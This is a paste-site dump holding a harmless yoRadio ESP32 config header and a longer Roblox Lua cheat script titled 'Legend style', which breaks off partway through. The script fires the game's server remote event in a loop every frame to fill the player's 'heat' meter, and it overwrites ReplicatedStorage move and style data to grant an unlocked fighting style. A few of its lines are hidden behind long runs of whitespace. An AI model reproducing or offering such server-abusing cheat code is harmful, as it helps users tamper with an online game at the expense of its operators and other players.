Lcb0k4rY,myoptions.h file for yoRadio - ST7789 - PCM5102A - IR remote,LeventeDaradici,C++,Tuesday 23rd of April 2024 08:39:36 AM CDT,"#ifndef myoptions_h
#define myoptions_h

/* https://www.youtube.com/@LeventeDaradici/videos
/* https://youtu.be/48McDlKZ_2c

/* Generated by myoptions.h generator - v0.8.1 */
/* https://e2002.github.io/docs/myoptions-generator.html?r=71,2,14,41,43&i=1,2,3,4,15,16,17&v=4,5,-1,255,27,26,25 */
/* Put this file next to yoRadio.ino and restart Arduino IDE. */

/* !!! Attention !!! */
/* This configuration depends on some additional libraries. Please install them using the library manager: */
/* Adafruit GFX Library, Adafruit ST7735 and ST7789 Library */

/* !!! Do not be alarmed, all right, the default values ​​are not included in this file !!! */

#define DSP_MODEL			DSP_ST7789

#define IR_PIN                15
#define IR_TIMEOUT            80    

#endif
"
6L4rvKc9,Legend style,Dsaqwed123,LScript,Tuesday 23rd of April 2024 08:05:51 AM CDT,"local sound = Instance.new(""Sound"")
sound.SoundId = ""rbxassetid://9426968107"" -- 9426968107
sound.Looped = true
sound.Parent = workspace
sound.Volume = 0.6
sound:Play()
getfenv().Activated = true

local function FillHeat()
    local Event = game:GetService(""ReplicatedStorage"").Events.ME

    for i=1,6 do
        local A_1 =  {
            [1] = ""heat"", 
            [2] = game:GetService(""ReplicatedStorage"").Moves.Taunt
        }
        Event:FireServer(A_1)
    end
end

spawn(function()
    while true do
        task.wait()
        if not Activated then break end
        FillHeat()
    end
end)

local plr = game.Players.LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface
local bt = interf.Battle
local main = bt.Main

local menu = pgui.MenuUI.Menu 
local abil = menu.Abilities.Frame.Frame.Frame
                                              
if game.ReplicatedStorage.Styles:FindFirstChild(""Brawler"") then
v = game.ReplicatedStorage.Styles[""Brawler""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end                          
v.Name = ""Brawler""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStandingShotgun"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStandingShotgun""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopperShotgun'
v.Name = ""H_GunStandingShotgun""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Brawler[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 1.9
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Brawler[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = Color3.fromRGB(241, 240, 234)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Strike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""LThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""LThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_LegToss'
v.Name = ""LThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FullStunned"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FullStunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_GUltimateEssence'
v.Name = ""H_FullStunned""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush4"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack4'
v.Name = ""Rush4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike3'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike5'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike5"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Strike5'
v.Name = ""Strike5""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Brawler[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'GGrab'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""BlockStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""BlockStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'TigerDrop'
v.Name = ""BlockStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_BackWall"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_BackWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_WallSmashing'
v.Name = ""H_BackWall""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSolo"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSolo""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Escape'
v.Name = ""H_CounterSolo""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""RedHeat"") then
v = game.ReplicatedStorage.Styles.Brawler[""RedHeat""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""RedHeat""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""GrabStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""GrabStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_GuruParry'
v.Name = ""GrabStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""StanceStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""StanceStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'TigerDrop'
v.Name = ""StanceStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""StrikeThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""StrikeThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_FinishingHold'
v.Name = ""StrikeThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_StanceFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_StanceFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_HeadPressUp'
v.Name = ""H_StanceFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Brawler[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'Legend'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Throw"") then
v = game.ReplicatedStorage.Styles.Brawler[""Throw""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_BeastToss'
v.Name = ""Throw""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""DoubleBlows"") then
v = game.ReplicatedStorage.Styles.Brawler[""DoubleBlows""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""DoubleBlows""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike4"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike3'
v.Name = ""2Strike4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike2"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike1'
v.Name = ""2Strike2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike3"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike2'
v.Name = ""2Strike3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike5"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike4'
v.Name = ""2Strike5""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabOnWall"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabOnWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_WallSmack'
v.Name = ""H_GrabOnWall""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""GrabCorpses"") then
v = game.ReplicatedStorage.Styles.Brawler[""GrabCorpses""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""GrabCorpses""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeB"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeBack'
v.Name = ""EvadeStrikeB""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeF"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeForward'
v.Name = ""EvadeStrikeF""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeL"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeLeft'
v.Name = ""EvadeStrikeL""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeR"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeRight'
v.Name = ""EvadeStrikeR""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""DashAttack"") then
v = game.ReplicatedStorage.Styles.Brawler[""DashAttack""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'RDashAttack'
v.Name = ""DashAttack""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Distanced"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Distanced""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FastFootworkBack'
v.Name = ""H_Distanced""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_TwoHandeds"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_TwoHandeds""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_SelfDestruct'
v.Name = ""H_TwoHandeds""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FullHeat"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FullHeat""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_GUltimateEssence'
v.Name = ""H_FullHeat""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabStanding"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Fisticuffs'
v.Name = ""H_GrabStanding""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllRight"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllRight""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterRight'
v.Name = ""H_CounterSoloAllRight""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllLeft"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllLeft""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterLeft'
v.Name = ""H_CounterSoloAllLeft""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllFront"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllFront""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterFront'
v.Name = ""H_CounterSoloAllFront""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllBack"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllBack""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterBack'
v.Name = ""H_CounterSoloAllBack""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabStanding2"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabStanding2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Swing'
v.Name = ""H_GrabStanding2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_RunningFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_RunningFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FinishingBlow'
v.Name = ""H_RunningFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_StandingBehind"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_StandingBehind""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_KnockOut'
v.Name = ""H_StandingBehind""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_SuperEvading"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_SuperEvading""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Rolling'
v.Name = ""H_SuperEvading""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Brawler[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'DragonTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Running4"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Running4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Terror'
v.Name = ""H_Running4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""HThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""HThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_FinishingHold2'
v.Name = ""HThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""LHThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""LHThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_BHeavyToss'
v.Name = ""LHThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenKick'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenStomp'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStandingHandgun"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStandingHandgun""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopperHandgun'
v.Name = ""H_GunStandingHandgun""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStanding"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopper'
v.Name = ""H_GunStanding""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Brawler[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Brawler)
end

v.AnimationId = ""rbxassetid://12120045620""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Brawler.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Brawler.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Moves.H_UltimateEssence:FindFirstChild(""MoveName"") then
v = game.ReplicatedStorage.Moves.H_UltimateEssence[""MoveName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_UltimateEssence)
end
v.Value = 'Ultimate Essence '
v.Name = ""MoveName""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Closest"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Closest""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '40'
v.Name = ""Closest""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Distance"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Distance""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '50'
v.Name = ""Distance""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Within"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Within""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '15'
v.Name = ""Within""
                                                                                                                                                                                                                                                                                                                                                                                                                                                main.Heat.noheattho.Text = ""Heat Actions Disabled""
	                                                                                                                                                                                                                                                                                                                                                                                                                                            main.Heat.noheattho.Size = UDim2.new(10, 0, 1, 0)

	                                                                                                                                                                                                                                                                                                                                                                                                                                            menu.Bars.Mobile_Title.Visible = true

if game.ReplicatedStorage.Moves:FindFirstChild(""DragonTaunt"") then
v = game.ReplicatedStorage.Moves[""DragonTaunt""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves)
end
v.Name = ""DragonTaunt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Dmg"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Dmg""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0
v.Name = ""Dmg""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HitboxLocations"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HitboxLocations""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = '[[""RightHand"",3,[0,-1,0]],[""RightLowerArm"",1.5,[0,0,0]],[""RightUpperArm"",1,[0,0,0]]]'
v.Name = ""HitboxLocations""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""AniSpeed"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""AniSpeed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 1.225
v.Name = ""AniSpeed""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Sound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Sound""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 'Yell'
v.Name = ""Sound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""NoDmg"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""NoDmg""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""NoDmg""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HeatAt"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HeatAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.15
v.Name = ""HeatAt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HeatGain"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HeatGain""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 20
v.Name = ""HeatGain""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""ForceSound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""ForceSound""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""ForceSound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""TauntSound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""TauntSound""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""TauntSound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""EndAt"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""EndAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.8
v.Name = ""EndAt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves.DragonTaunt)
end

v.AnimationId = ""rbxassetid://10928237540""
v.Name = ""Anim""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveForward"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveForward""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 2
v.Name = ""MoveForward""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveStart2"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveStart2""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 1.8
v.Name = ""MoveStart2""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveDuration"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveDuration""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.4
v.Name = ""MoveDuration""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Dragon"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Dragon""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""Dragon""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Cancelable"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Cancelable""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""Cancelable""
if game.ReplicatedStorage.Moves[""龍Attack1""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack1""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack1""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Attack2""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack2""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack2""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Attack3""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack3""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack3""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Attack4""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack4""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack4""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Strike5""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Strike5""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Strike5""])
end
v.Value = 0.5 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""BStrike5""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""BStrike5""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""BStrike5""])
end
v.Value = 0.5 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Styles:FindFirstChild(""Rush"") then
v = game.ReplicatedStorage.Styles[""Rush""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end
v.Name = ""Rush""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedF"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkFront'
v.Name = ""H_EvadedF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Stunning"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Stunning""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Reversal'
v.Name = ""H_Stunning""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""StartBlock"") then
v = game.ReplicatedStorage.Styles.Rush[""StartBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://10848090844""
v.Name = ""StartBlock""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Rush[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RushTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Rush[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 1.2
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Rush[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Rush)
end
